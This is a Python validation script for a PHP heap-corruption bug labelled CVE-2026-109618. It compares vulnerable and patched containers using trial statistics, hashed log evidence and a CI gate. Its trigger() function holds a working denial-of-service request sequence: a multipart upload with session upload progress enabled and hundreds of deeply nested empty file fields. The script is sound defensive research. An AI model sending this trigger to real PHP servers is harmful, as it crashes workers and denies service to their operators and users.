#!/usr/bin/env python3
"""c_validate v2.2 -- evidence-model validator for CVE-2026-109618.

Changes in v2.2 (see ERRATA.md):
  * per-trial corruption is counted over the container's whole log. v2.1 and
    earlier compared `docker logs --tail 400 | grep -c` before and after each
    trial; that sliding window stops rising once old abort lines scroll out,
    and it marked ten of twenty aborting trials on PHP 8.4.26 as clean;
  * "zend_mm_heap corrupted" lines and Apache exit notices are counted
    separately instead of as one two-lines-per-abort number;
  * a trial whose log cannot be read is recorded as unknown (null), not as
    "no corruption", and an unknown fails the gate;
  * the evidence file is the complete container log, written as the exact
    bytes that are hashed.
  The request sequence itself is unchanged. The v2.1.0 script that produced
  the October 2026 report is kept as archive/c_validate_v2.1.0.py.

Changes over v1:
  * multi-dimensional verdict fields (Yes/No/Unknown), never a single label;
  * Wilson confidence intervals for OOM and corruption rates;
  * per-trial worker pid + abort attribution;
  * provenance capture per target (php -v, ini knobs, image digest, OS);
  * raw log evidence written to disk and hashed, each verdict linked to it;
  * detection-site vs creation-site attribution kept as separate fields;
  * code_execution derived from evidence, not hard-coded.

Usage:
  python3 c_validate.py --trials 20 \
    --target '8.4.26|http://127.0.0.1:8084/decode.php|vulnerable|php2shell-cat-c-vuln|http://127.0.0.1:8084/probe.php' \
    --target '8.4.27|http://127.0.0.1:8088/decode.php|patched|p2s-c8427|http://127.0.0.1:8088/probe.php' \
    --evidence-dir evidence --out c_validation.json
"""
import argparse, hashlib, json, math, os, subprocess, sys, time, uuid
from datetime import datetime, timezone

import requests

from logcount import container_counts, count_signals, delta, read_container_log

VERSION = "2.2.0"


def now():
    return datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")


def sh(cmd, timeout=25):
    try:
        return subprocess.run(cmd, shell=True, capture_output=True,
                              timeout=timeout).stdout.decode("utf-8", "replace")
    except Exception:
        return ""


def upper95_onesided(k, n):
    """Exact one-sided 95% upper bound for a binomial proportion.

    For k == 0 this is 1 - 0.05**(1/n) (Clopper-Pearson upper limit).
    Returns None for k > 0 (not computed here; see Wilson interval instead).
    """
    if n <= 0:
        return None
    if k == 0:
        return round(1 - 0.05 ** (1.0 / n), 4)
    return None


def sha256_file(p):
    try:
        with open(p, "rb") as fh:
            return hashlib.sha256(fh.read()).hexdigest()
    except OSError:
        return None


def wilson(k, n, z=1.96):
    if n == 0:
        return [None, None]
    p = k / n
    d = 1 + z * z / n
    c = p + z * z / (2 * n)
    m = z * math.sqrt(p * (1 - p) / n + z * z / (4 * n * n))
    return [round(max(0.0, (c - m) / d), 4), round(min(1.0, (c + m) / d), 4)]


def counts_after_trial(container, before, expect_abort, wait=3.0, step=0.25):
    """Whole-log counts once a trial has finished.

    Apache's parent writes the exit notice when it reaps the child, which can
    be up to a second after the client sees the connection drop. When the trial
    shows signs of a dead worker and no notice has appeared yet, wait briefly
    for it instead of recording the abort against the next trial.
    """
    after = container_counts(container)
    if before is None or after is None or not expect_abort:
        return after
    deadline = time.time() + wait
    while after is not None and after["exit"] <= before["exit"] and time.time() < deadline:
        time.sleep(step)
        after = container_counts(container)
    return after


def worker_aborted(pid_before, pid_after, change):
    """True / False, or None when neither the pids nor the log can say."""
    if pid_before and pid_after and pid_before != pid_after:
        return True
    if change is not None and change["exit"] > 0:
        return True
    if change is not None or (pid_before and pid_after):
        return False
    return None


def probe_pid(url):
    if not url:
        return None
    try:
        return int(requests.get(url, timeout=8).json().get("pid"))
    except Exception:
        return None


def php_provenance(container):
    prov = {"container": container}
    if not container:
        return prov
    prov["image_digest"] = sh("docker inspect %s --format '{{.Image}}'" % container).strip() or None
    prov["image"] = sh("docker inspect %s --format '{{.Config.Image}}'" % container).strip() or None
    prov["started"] = sh("docker inspect %s --format '{{.State.StartedAt}}'" % container).strip() or None
    prov["php_version"] = sh("docker exec %s php -v 2>/dev/null | head -1" % container).strip() or None
    knobs = {}
    for k in ("memory_limit", "post_max_size", "upload_max_filesize", "max_file_uploads",
              "max_input_vars", "max_input_nesting_level", "session.upload_progress.enabled",
              "session.serialize_handler", "session.save_path", "session.use_strict_mode"):
        v = sh("docker exec %s php -i 2>/dev/null | grep -m1 '^%s =>' " % (container, k)).strip()
        knobs[k] = v.split("=>")[-1].strip() if v else None
    prov["ini"] = knobs
    prov["os"] = sh("docker exec %s sh -c 'head -2 /etc/os-release' " % container).replace("\n", " ").strip()
    prov["host_os"] = sh("uname -sr").strip()
    return prov


def trigger(url, sid, probe_url=None):
    rec = {"oom": False, "a_status": None, "b_status": None,
           "a_error": None, "b_error": None,
           "pid_before": probe_pid(probe_url), "pid_after": None}
    b = "----a" + uuid.uuid4().hex
    parts = [("--%s\r\nContent-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\""
              "\r\n\r\np\r\n" % b).encode()]
    for i in range(600):
        name = "files[%d]" % i + "".join("[k%d]" % j for j in range(45))
        parts.append(("--%s\r\nContent-Disposition: form-data; name=\"%s\"; filename=\"\""
                      "\r\n\r\n" % (b, name)).encode())
    parts.append(("--%s--\r\n" % b).encode())
    body = b"".join(parts)

    def gen():
        for i in range(0, len(body), 8192):
            yield body[i:i + 8192]

    try:
        r = requests.post(url, data=gen(), cookies={"PHPSESSID": sid},
                          headers={"Content-Type": "multipart/form-data; boundary=" + b},
                          timeout=60)
        rec["a_status"] = r.status_code
        rec["oom"] = "Allowed memory" in r.text
    except Exception as e:
        rec["a_error"] = type(e).__name__

    bd = "----b" + uuid.uuid4().hex
    p = ("--%s\r\nContent-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\""
         "\r\n\r\np\r\n--%s--\r\n" % (bd, bd)).encode()
    try:
        r = requests.post(url, data=p, cookies={"PHPSESSID": sid},
                          headers={"Content-Type": "multipart/form-data; boundary=" + bd},
                          timeout=30)
        rec["b_status"] = r.status_code
    except Exception as e:
        rec["b_error"] = type(e).__name__
    rec["pid_after"] = probe_pid(probe_url)
    return rec


def capture_log(container, path):
    """Save the container's complete log and describe it.

    The whole log, not a tail, so the evidence always reaches back past the
    start of the run. Written as bytes so the file on disk is exactly what was
    hashed, on any platform.
    """
    text = read_container_log(container, timeout=120)
    if text is None:
        return None
    data = text.encode("utf-8")
    os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
    with open(path, "wb") as fh:
        fh.write(data)
    counts = count_signals(text)
    return {"path": path, "sha256": hashlib.sha256(data).hexdigest(),
            "bytes": len(data), "lines": counts["lines"],
            "heap_lines": counts["heap"], "abort_lines": counts["exit"]}


def run_target(name, url, kind, container, probe_url, trials, evdir):
    print("[*] %-10s %s (%s)" % (name, url, kind), flush=True)
    prov = php_provenance(container)
    before_all = container_counts(container)
    records = []
    for i in range(trials):
        c0 = container_counts(container)
        rec = trigger(url, "ev%03d%s" % (i, uuid.uuid4().hex[:6]), probe_url)
        pid_changed = bool(rec["pid_before"] and rec["pid_after"]
                           and rec["pid_before"] != rec["pid_after"])
        c1 = counts_after_trial(container, c0,
                                expect_abort=bool(rec["b_error"]) or pid_changed)
        change = delta(c0, c1)
        rec["trial"] = i
        rec["ts"] = now()
        rec["heap_lines"] = None if change is None else change["heap"]
        rec["exit_notices"] = None if change is None else change["exit"]
        # None means the log could not be read: unknown, not "no corruption".
        rec["corruption"] = None if change is None else change["heap"] > 0
        rec["worker_aborted"] = worker_aborted(rec["pid_before"], rec["pid_after"], change)
        records.append(rec)
        time.sleep(0.25)
    after_all = container_counts(container)
    ev = capture_log(container, os.path.join(evdir, "%s.log" % name))

    oom_k = sum(1 for r in records if r["oom"])
    known = [r for r in records if r["corruption"] is not None]
    cor_k = sum(1 for r in known if r["corruption"])
    ab_k = sum(1 for r in records if r["worker_aborted"])
    run = delta(before_all, after_all)
    stats = {
        "trials": trials,
        "oom_yes": oom_k, "oom_rate": round(oom_k / trials, 3),
        "oom_ci95": wilson(oom_k, trials),
        "corruption_yes": cor_k,
        "corruption_unknown": trials - len(known),
        "corruption_rate": round(cor_k / len(known), 3) if known else None,
        "corruption_ci95": wilson(cor_k, len(known)),
        "corruption_upper95_onesided": upper95_onesided(cor_k, len(known)),
        "worker_aborts": ab_k,
        # one exit notice per dead worker, over the whole run
        "abort_events": None if run is None else run["exit"],
        "heap_lines": None if run is None else run["heap"],
    }
    return {"name": name, "url": url, "kind": kind, "container": container,
            "probe_url": probe_url, "provenance": prov, "stats": stats,
            "records": records, "evidence": ev}


def verdict(t, diff, attribution_artifact, creation_evidence):
    s = t["stats"]
    def tri(b):
        return "Yes" if b else ("No" if s["trials"] else "Unknown")
    if s["corruption_yes"] > 0:
        corruption = "Yes"
    elif s["trials"] and s["corruption_unknown"] == 0:
        corruption = "No"
    else:
        corruption = "Unknown"
    if s["worker_aborts"] > 0:
        aborted = "Yes"
    elif s["trials"] and all(r["worker_aborted"] is False for r in t["records"]):
        aborted = "No"
    else:
        aborted = "Unknown"
    v = {
        "oom_observed": tri(s["oom_yes"] > 0),
        "corruption_observed": corruption,
        "worker_aborted": aborted,
        "patch_differential": diff,
        "detection_site_attribution": "Unknown",
        "creation_site_attribution": "Unknown",
        "code_execution": "Not demonstrated",
    }
    # detection-site: confirmed only if a backtrace artifact exists AND heap corruption seen
    if s["corruption_yes"] > 0:
        v["detection_site_attribution"] = "Confirmed" if attribution_artifact and \
            os.path.exists(attribution_artifact) else "Partial"
    if creation_evidence and os.path.exists(creation_evidence):
        v["creation_site_attribution"] = "Confirmed"
    # code execution requires an explicit, reviewable evidence record.
    # accepted shape: {"kind": "marker_file"|"command_output", "path": ..., "sha256": ...}
    for r in t["records"]:
        e = r.get("execution_evidence")
        if (isinstance(e, dict)
                and e.get("kind") in ("marker_file", "command_output")
                and e.get("path") and e.get("sha256")
                and len(str(e["sha256"])) == 64):
            v["code_execution"] = "Demonstrated"
            break
    return v


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", action="append", required=True,
                    help="name|url|kind|container|probe_url")
    ap.add_argument("--trials", type=int, default=20)
    ap.add_argument("--min-trials", dest="min_trials", type=int, default=10)
    ap.add_argument("--evidence-dir", dest="evdir", default="evidence")
    ap.add_argument("--attribution-artifact", dest="attr_art",
                    default="C_ATTRIBUTION.md")
    ap.add_argument("--creation-evidence", dest="creation_ev", default=None)
    ap.add_argument("--out", default="c_validation.json")
    a = ap.parse_args()

    targets = []
    for spec in a.target:
        bits = spec.split("|")
        while len(bits) < 5:
            bits.append("")
        targets.append(bits[:5])

    print("c_validate v%s  %d targets x %d trials  %s"
          % (VERSION, len(targets), a.trials, now()))
    results = []
    for nm, url, kind, cont, probe in targets:
        r = run_target(nm, url, kind, cont, probe, a.trials, a.evdir)
        results.append(r)

    vuln = [r for r in results if r["kind"] == "vulnerable"]
    patch = [r for r in results if r["kind"] == "patched"]
    diff = "Inconclusive"
    if vuln and patch:
        v_hit = any(r["stats"]["corruption_yes"] > 0 for r in vuln)
        p_hit = any(r["stats"]["corruption_yes"] > 0 for r in patch)
        all_oom = all(r["stats"]["oom_yes"] > 0 for r in results)
        blind = any(r["stats"]["corruption_unknown"] > 0 for r in results)
        if v_hit and not p_hit and all_oom and not blind:
            diff = "Confirmed"
        elif not v_hit and not p_hit and not blind:
            diff = "Not observed"
    for r in results:
        r["verdict"] = verdict(r, diff, a.attr_art, a.creation_ev)

    # CI gate
    gate = {"pass": True, "reasons": []}
    if a.trials < a.min_trials:
        gate["pass"] = False
        gate["reasons"].append("trials (%d) below minimum (%d)" % (a.trials, a.min_trials))
    for r in results:
        if r["stats"]["oom_yes"] == 0:
            gate["pass"] = False
            gate["reasons"].append("%s: OOM not observed, comparison uninformative" % r["name"])
        if not r["evidence"] or r["evidence"]["bytes"] == 0:
            gate["pass"] = False
            gate["reasons"].append("%s: missing raw log evidence" % r["name"])
        if r["stats"]["corruption_unknown"] > 0:
            gate["pass"] = False
            gate["reasons"].append("%s: log unreadable for %d trial(s), corruption unknown"
                                   % (r["name"], r["stats"]["corruption_unknown"]))
    if diff != "Confirmed":
        gate["pass"] = False
        gate["reasons"].append("patch differential: %s" % diff)

    report = {
        "tool": "c_validate v%s" % VERSION,
        "counting": {
            "method": ("the container's whole log is counted before and after each "
                       "trial, with no tail window; 'zend_mm_heap corrupted' lines and "
                       "Apache exit notices are counted separately"),
            "corruption": ("a trial is corruption-positive when a heap-corrupted line "
                           "appears during it"),
            "unknown": ("a trial whose log could not be read is null (unknown), never "
                        "a negative"),
        },
        "statistics": {
            "interval_method": "Wilson score interval, two-sided 95% (z=1.96)",
            "zero_event_bound": ("corruption_upper95_onesided = 1 - 0.05^(1/n) "
                                 "(Clopper-Pearson upper limit), reported when 0 events"),
            "independence": ("trials run sequentially against the same worker; "
                             "worker state and allocator history can correlate them, "
                             "so treat the intervals as approximate, not as a "
                             "sampling of independent identical runs"),
        },
        "differential_basis": ("difference in OBSERVED outcomes under this trigger; "
                               "it is not by itself evidence that the patch caused "
                               "the difference. Source analysis is separate and "
                               "labelled in PATCH_MAP.md."),
        "attribution": {
            "detection_site": "confirmed by backtrace (C_ATTRIBUTION.md)",
            "creation_site": "unknown (no watchpoint / ASAN data)",
            "causal_request": "not established (corruption detected in a later request)",
        },
        "generated": now(),
        "config": {"trials": a.trials, "min_trials": a.min_trials, "ci": "Wilson 95%"},
        "targets": results,
        "patch_differential": diff,
        "gate": gate,
        "artifacts": {
            "validator_script": {"path": os.path.abspath(__file__),
                                 "sha256": sha256_file(os.path.abspath(__file__))},
            "cases": {"path": "c_cases.json", "sha256": sha256_file("c_cases.json")},
            "patch_map": {"path": "PATCH_MAP.md", "sha256": sha256_file("PATCH_MAP.md")},
            "ci_gate": {"path": "ci_validate.sh", "sha256": sha256_file("ci_validate.sh")},
            "evidence": [{"path": t["evidence"]["path"],
                          "sha256": t["evidence"]["sha256"]}
                         for t in results if t.get("evidence")],
        },
        "scope": ("Corruption is a denial-of-service observation. No memory "
                  "disclosure or code execution is attempted or claimed."),
    }
    with open(a.out, "w") as fh:
        json.dump(report, fh, indent=2)
    report_sha = sha256_file(a.out)
    with open(a.out + ".sha256", "w") as fh:
        fh.write("%s  %s\n" % (report_sha, os.path.basename(a.out)))

    print("\n%-10s %-9s %-9s %-9s %-22s %s"
          % ("target", "kind", "oom", "corr", "corr 95% CI", "php"))
    for r in results:
        s = r["stats"]
        ci = s["corruption_ci95"]
        known = s["trials"] - s["corruption_unknown"]
        ci_text = "[%.2f, %.2f]" % (ci[0], ci[1]) if ci[0] is not None else "[unknown]"
        print("%-10s %-9s %-9s %-9s %-22s %s"
              % (r["name"], r["kind"], "%d/%d" % (s["oom_yes"], s["trials"]),
                 "%d/%d" % (s["corruption_yes"], known), ci_text,
                 (r["provenance"].get("php_version") or "?")[:26]))
    print("\npatch differential: %s" % diff)
    print("gate: %s" % ("PASS" if gate["pass"] else "FAIL " + "; ".join(gate["reasons"])))
    print("report -> %s" % a.out)
    return 0 if gate["pass"] else 1


if __name__ == "__main__":
    sys.exit(main())
